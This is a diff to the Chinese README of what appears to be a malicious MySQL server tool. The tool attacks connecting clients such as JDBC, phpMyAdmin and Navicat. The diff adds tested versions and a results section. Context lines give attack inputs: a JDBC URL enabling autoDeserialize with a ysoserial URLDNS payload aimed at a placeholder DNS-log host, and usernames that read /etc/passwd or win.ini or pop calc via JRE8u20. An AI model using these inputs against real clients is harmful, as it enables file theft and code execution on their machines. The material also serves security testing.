@@ -17,7 +17,7 @@
 4. 运行：`python server.py`
 
 ## 测试环境：
-1. jdk1.8.20+mysql-connector-java 8.0.14/5.1.22(Windows下反序列化、文件读取)
+1. jdk1.8.20+mysql-connector-java 8.0.14/5.1.22(Windows下反序列化（JRE8u20）、文件读取)
 2. PHPMyAdmin(Windows+Linux文件读取，可以使用相对路径读取php文件内容)
 3. Navicat 12(Windows下文件读取，需要切换到mysql_clear_password认证插件)
 
@@ -33,6 +33,16 @@
       - 5.x:`jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_URLDNS_http://yourdns.log.addr/`
 3. 关于认证：默认认证插件一般使用**mysql_native_password**,但是由于议实现的问题，navicat下会连接失败，此时在使用的用户名后追加 **_clear** 即可切换为mysql_clear_password,navicat连接成功,读取到文件。
     - **例如：** fileread\_/etc/passwd_clear
+
+## 效果
+
+Navicat文件读取（用户名使用win_ini_clear）
+
+![image-20200414150112426](README.assets/image-20200414150112426.png)
+
+JDK 1.8.20+mysql-connector-java 8.0.14反序列化，使用用户名：yso_JRE8u20_calc
+
+![image-20200414150417471](README.assets/image-20200414150417471.png)
 
 ## 踩过的坑
 
